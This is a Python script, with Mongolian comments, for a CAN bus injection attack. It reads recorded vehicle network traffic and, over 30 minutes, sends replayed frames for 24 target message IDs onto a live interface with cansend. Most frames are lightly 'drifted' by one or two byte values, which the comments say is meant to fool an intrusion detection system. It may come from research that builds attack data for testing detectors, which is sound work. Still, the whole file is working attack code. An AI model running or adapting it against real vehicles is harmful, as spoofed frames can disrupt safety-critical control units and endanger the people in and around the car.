#!/usr/bin/env python3

import csv
import random
import time
import subprocess
import logging
from datetime import datetime
from typing import List, Dict, Tuple

DATASET_PATH = "dataset200.trc"  
CAN_INTERFACE = "can0"
MESSAGE_RATE = 9.5  
ATTACK_DURATION = 30 * 60  

TARGET_IDS = [
    "0018", "0034", "0153", "0370", "0440", "02B0",  # Анхны 6
    "0164", "0165", "018F", "01F1", "0220", "0260",  # Нэмэлт
    "02A0", "02C0", "0316", "0329", "0350", "0382",  # Нэмэлт
    "043F", "04B0", "04F0", "04F1", "04F2", "0545"   # Нэмэлт (24 ширхэг)
]


DRIFT_PROBABILITY = 0.7  # 70% магадлалтай drift хийнэ
MAX_DRIFT_VALUE = 2  # +/- 2-оос ихгүй өөрчлөлт
MAX_MESSAGES_PER_ID = 50

log_filename = f"attack_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_filename),
        logging.StreamHandler()
    ]
)

class DatasetLoader:
    def __init__(self, file_path: str):
        self.file_path = file_path
        self.messages = []
        self.messages_by_id = {}
        
    def load(self):
        """TRC эсвэл CSV файлаас нормал мессежүүдийг уншина"""
        logging.info(f"Dataset уншиж байна: {self.file_path}")
        
        if self.file_path.lower().endswith('.trc'):
            self._load_trc()
        elif self.file_path.lower().endswith('.csv'):
            self._load_csv()
        else:
            raise ValueError("Зөвхөн .trc эсвэл .csv файл дэмжигдэнэ!")
        
        logging.info(f"Нийт {len(self.messages)} message уншлаа")
        logging.info(f"Өөр {len(self.messages_by_id)} ID олдлоо")
        
        # ID-үүдийг хэвлэх
        if self.messages_by_id:
            id_list = sorted(self.messages_by_id.keys())
            logging.info(f"Олдсон ID-ууд: {', '.join(id_list)}")
            for can_id in id_list[:5]:  # Эхний 5 ID-ний жишээ
                count = len(self.messages_by_id[can_id])
                logging.info(f"  ID {can_id}: {count} мессеж")
        
        return self
    
    def _load_trc(self):
        """TRC файл (Vector CANoe/CANalyzer trace) уншина - Memory optimized"""
        logging.info("TRC формат парс хийж байна...")
        
        id_message_counts = {}  # ID бүрээс хэдэн мессеж аль хэдийн авсан
        
        with open(self.file_path, 'r', encoding='latin-1', errors='ignore') as f:
            line_num = 0
            parsed_count = 0
            skipped_count = 0
            
            for line in f:
                line_num += 1
                
                # Progress хэвлэх (100,000 мөр бүрт)
                if line_num % 100000 == 0:
                    logging.info(f"Уншсан мөр: {line_num:,} | Хадгалсан: {parsed_count:,} | Алгассан: {skipped_count:,}")
                
                line = line.strip()
                
                # Хоосон мөр эсвэл тайлбар алгасах
                if not line or line.startswith(';') or line.startswith('//'):
                    continue
                
                # Формат: 643935)    308547.5  Rx         01F1  8  00 52 EF 00 0F EC D0 0E
                parts = line.split()
                
                if len(parts) < 6:
                    continue
                
                try:
                    # Rx хайх
                    rx_idx = -1
                    for i, part in enumerate(parts):
                        if part.upper() in ['RX', 'TX']:
                            rx_idx = i
                            break
                    
                    if rx_idx == -1 or rx_idx + 2 >= len(parts):
                        continue
                    
                    # ID нь Rx дараах хэсэг (leading 0 хадгална!)
                    can_id = parts[rx_idx + 1].upper()
                    
                    # ID бүрээс хязгаарт хүрсэн эсэхийг шалгах
                    if can_id in id_message_counts:
                        if id_message_counts[can_id] >= MAX_MESSAGES_PER_ID:
                            skipped_count += 1
                            continue
                    else:
                        id_message_counts[can_id] = 0
                    
                    # DLC нь дараагийнх
                    dlc = int(parts[rx_idx + 2])
                    
                    # Data байтууд rx_idx + 3-аас эхлэнэ
                    data_bytes = []
                    for j in range(rx_idx + 3, min(rx_idx + 11, len(parts))):
                        try:
                            data_bytes.append(int(parts[j], 16))
                        except ValueError:
                            break
                    
                    if len(data_bytes) < dlc:
                        continue
                    
                    # 8 байт болтлоо дүүргэх
                    while len(data_bytes) < 8:
                        data_bytes.append(0)
                    
                    # Эхний 8 байт авах
                    data_bytes = data_bytes[:8]
                    
                    msg = {
                        'id': can_id,
                        'dlc': dlc,
                        'data': data_bytes
                    }
                    
                    self.messages.append(msg)
                    
                    if msg['id'] not in self.messages_by_id:
                        self.messages_by_id[msg['id']] = []
                    self.messages_by_id[msg['id']].append(msg)
                    
                    id_message_counts[can_id] += 1
                    parsed_count += 1
                    
                    # Анхны хэдэн мөрийг debug хэвлэх
                    if parsed_count <= 3:
                        data_str = ' '.join(f'{b:02X}' for b in data_bytes)
                        logging.debug(f"Parsed: ID={msg['id']} DLC={dlc} Data=[{data_str}]")
                    
                except (ValueError, IndexError) as e:
                    logging.debug(f"Мөр {line_num} parse хийж чадсангүй: {e}")
                    continue
        
        logging.info(f"TRC файлаас {parsed_count:,} мессеж амжилттай уншлаа")
        logging.info(f"Нийт мөр: {line_num:,} | Алгассан: {skipped_count:,}")
    
    def _load_csv(self):
        """CSV файл уншина"""
        with open(self.file_path, 'r') as f:
            reader = csv.DictReader(f)
            for row in reader:
                msg = {
                    'id': row['ID'].strip().upper(),
                    'dlc': int(row['LEN']),
                    'data': [
                        int(row.get(f'D{i}', '0'), 16) 
                        for i in range(1, 9)
                    ]
                }
                self.messages.append(msg)
                
                if msg['id'] not in self.messages_by_id:
                    self.messages_by_id[msg['id']] = []
                self.messages_by_id[msg['id']].append(msg)

class PayloadGenerator:
    def __init__(self, messages_by_id: Dict):
        self.messages_by_id = messages_by_id
        
    def select_baseline(self, target_id: str) -> Dict:
        """Тухайн ID-ний мессежүүдээс санамсаргүй нэгийг сонгох"""
        if target_id not in self.messages_by_id:
            logging.warning(f"ID {target_id} dataset-д байхгүй!")
            return None
        
        pool = self.messages_by_id[target_id]
        return random.choice(pool)
    
    def apply_drift(self, baseline: Dict) -> Dict:
        """Drift technique: бага өөрчлөлт хийж IDS-ийг төөрөгдүүлэх"""
        drifted = {
            'id': baseline['id'],
            'dlc': baseline['dlc'],  # DLC ХЭЗЭЭ Ч өөрчлөхгүй!
            'data': baseline['data'].copy()
        }
        
        # Drift хийх эсэхийг шийднэ
        if random.random() > DRIFT_PROBABILITY:
            return drifted  # Drift хийхгүй, энгийн baseline
        
        # 1-2 байт дээр drift хийнэ
        num_bytes_to_drift = random.randint(1, 2)
        drift_positions = random.sample(range(8), num_bytes_to_drift)
        
        for pos in drift_positions:
            original = drifted['data'][pos]
            
            # Drift техник: ±1 эсвэл ±2
            drift_amount = random.randint(-MAX_DRIFT_VALUE, MAX_DRIFT_VALUE)
            new_value = original + drift_amount
            
            # 0x00 - 0xFF хязгаарт байлгах
            new_value = max(0, min(255, new_value))
            
            drifted['data'][pos] = new_value
            
            logging.debug(f"Drift @ byte {pos}: 0x{original:02X} -> 0x{new_value:02X} (Δ{drift_amount:+d})")
        
        return drifted

class CANSender:
    def __init__(self, interface: str):
        self.interface = interface
        self.total_sent = 0
        self.success_count = 0
        self.error_count = 0
        
    def send_message(self, msg: Dict) -> bool:
        """cansend ашиглан мессеж илгээх"""
        try:
            # CAN ID форматлах
            # Standard CAN (11-bit): 3 оронтой HEX хэрэгтэй
            # 0081 -> 081, 0080 -> 080, 0370 -> 370, 02B0 -> 2B0
            can_id_clean = msg['id'].lstrip('0') or '0'
            
            # 3 орноос бага бол 0-ээр нөхөх (080, 081 гэх мэт)
            if len(can_id_clean) < 3:
                can_id_clean = can_id_clean.zfill(3)
            
            # Payload форматлах: "ID#DATA1DATA2..."
            data_hex = ''.join(f'{byte:02X}' for byte in msg['data'][:msg['dlc']])
            frame = f"{can_id_clean}#{data_hex}"
            
            # cansend ажиллуулах
            result = subprocess.run(
                ['cansend', self.interface, frame],
                capture_output=True,
                timeout=1
            )
            
            if result.returncode == 0:
                self.success_count += 1
                self.total_sent += 1
                logging.info(
                    f"Sent #{self.total_sent} | ID={msg['id']} DLC={msg['dlc']} "
                    f"DATA={data_hex} FRAME={frame}"
                )
                return True
            else:
                self.error_count += 1
                error_msg = result.stderr.decode().strip()
                # Device алдааг нэг удаа л хэвлэх
                if 'if_nametoindex' in error_msg and self.error_count == 1:
                    logging.error(f"❌ CAN interface '{self.interface}' олдохгүй байна!")
                    logging.error(f"   Шалгах: ip link show {self.interface}")
                    logging.error(f"   Идэвхжүүлэх: sudo ip link set {self.interface} up type can bitrate 500000")
                elif 'Wrong CAN-frame format' not in error_msg:
                    logging.error(f"✗ Failed: {frame} - {error_msg}")
                return False
                
        except Exception as e:
            self.error_count += 1
            logging.error(f"Exception sending message: {e}")
            return False
    
    def get_stats(self) -> Dict:
        """Статистик мэдээлэл"""
        return {
            'total': self.total_sent,
            'success': self.success_count,
            'error': self.error_count,
            'success_rate': (self.success_count / self.total_sent * 100) if self.total_sent > 0 else 0
        }

class AttackOrchestrator:
    def __init__(self, dataset_loader, target_ids, message_rate, duration):
        self.dataset_loader = dataset_loader
        self.target_ids = target_ids
        self.message_rate = message_rate
        self.duration = duration
        self.payload_gen = PayloadGenerator(dataset_loader.messages_by_id)
        self.sender = CANSender(CAN_INTERFACE)
        
    def run(self):
        """Халдлагын үндсэн loop"""
        logging.info("="*60)
        logging.info("ХАЛДЛАГА ЭХЭЛЛЭЭ")
        logging.info(f"Зорилтот ID-ууд: {self.target_ids}")
        logging.info(f"Rate: {self.message_rate} msg/sec")
        logging.info(f"Хугацаа: {self.duration} секунд")
        logging.info("="*60)
        
        interval = 1.0 / self.message_rate
        start_time = time.time()
        next_send_time = start_time
        message_count = 0
        
        try:
            while (time.time() - start_time) < self.duration:
                # Санамсаргүй ID сонгох
                target_id = random.choice(self.target_ids)
                
                # Baseline мессеж авах
                baseline = self.payload_gen.select_baseline(target_id)
                if baseline is None:
                    logging.warning(f"ID {target_id} dataset-д байхгүй, алгасаж байна")
                    continue
                
                # Drift хийх
                payload = self.payload_gen.apply_drift(baseline)
                
                # Илгээх
                success = self.sender.send_message(payload)
                
                if success:
                    message_count += 1
                    
                    # 100 мессеж бүрт статистик хэвлэх
                    if message_count % 100 == 0:
                        elapsed = time.time() - start_time
                        stats = self.sender.get_stats()
                        logging.info(
                            f"Progress: {message_count} msgs | "
                            f"Time: {elapsed:.1f}s | "
                            f"Success: {stats['success_rate']:.1f}%"
                        )
                
                # Rate limiting
                next_send_time += interval
                sleep_time = next_send_time - time.time()
                if sleep_time > 0:
                    time.sleep(sleep_time)
                
        except KeyboardInterrupt:
            logging.info("\n⚠ Хэрэглэгч зогсоолоо (Ctrl+C)")
        
        finally:
            self.print_summary(start_time)
    
    def print_summary(self, start_time):
        """Дүгнэлт статистик"""
        elapsed = time.time() - start_time
        stats = self.sender.get_stats()
        
        logging.info("="*60)
        logging.info("ХАЛДЛАГА ДУУСЛАА")
        logging.info(f"Нийт хугацаа: {elapsed:.1f} секунд")
        logging.info(f"Илгээсэн: {stats['total']} мессеж")
        logging.info(f"Амжилттай: {stats['success']} ({stats['success_rate']:.1f}%)")
        logging.info(f"Алдаа: {stats['error']}")
        logging.info(f"Дундаж rate: {stats['total']/elapsed:.2f} msg/sec")
        logging.info(f"Log файл: {log_filename}")
        logging.info("="*60)

def main():
    global TARGET_IDS  # Эхэнд нь зарлах
    
    # Dataset ачаалах
    loader = DatasetLoader(DATASET_PATH).load()
    
    # Dataset хоосон эсэхийг шалгах
    if not loader.messages_by_id:
        logging.error("Dataset-д мессеж олдсонгүй! TRC файл зөв эсэхийг шалгана уу.")
        logging.error(f"Файл: {DATASET_PATH}")
        return
    
    # TARGET_IDS шалгах
    available_ids = set(loader.messages_by_id.keys())
    target_set = set(TARGET_IDS)
    
    missing_ids = target_set - available_ids
    if missing_ids:
        logging.warning(f"⚠ Зорилтот ID-үүдээс dataset-д байхгүй: {missing_ids}")
        
        # Dataset-д байгаа ID-үүдийг санал болгох
        logging.info(f"\n📋 Dataset-д байгаа бүх ID-ууд ({len(available_ids)} ширхэг):")
        sorted_ids = sorted(available_ids, key=lambda x: int(x, 16))
        for can_id in sorted_ids:
            count = len(loader.messages_by_id[can_id])
            logging.info(f"   ID 0x{can_id}: {count} мессеж")
        
        # Байгаа ID-үүдийг ашиглах эсэхийг асуух
        logging.info(f"\n💡 Санал: Дээрх ID-үүдээс сонгож TARGET_IDS тохируулна уу")
        logging.info(f"Эсвэл энэ бүх ID-үүдийг автоматаар ашиглах бол Enter дарна уу (Ctrl+C = цуцлах)")
        
        try:
            input()
            # Бүх ID-үүдийг ашиглах
            TARGET_IDS = sorted_ids
            logging.info(f"✓ {len(TARGET_IDS)} ID-г автоматаар сонголоо")
        except KeyboardInterrupt:
            logging.info("\n Хэрэглэгч цуцаллаа")
            return
    
    # Attack эхлүүлэх
    orchestrator = AttackOrchestrator(
        dataset_loader=loader,
        target_ids=TARGET_IDS,
        message_rate=MESSAGE_RATE,
        duration=ATTACK_DURATION
    )
    
    orchestrator.run()

if __name__ == "__main__":
    main()
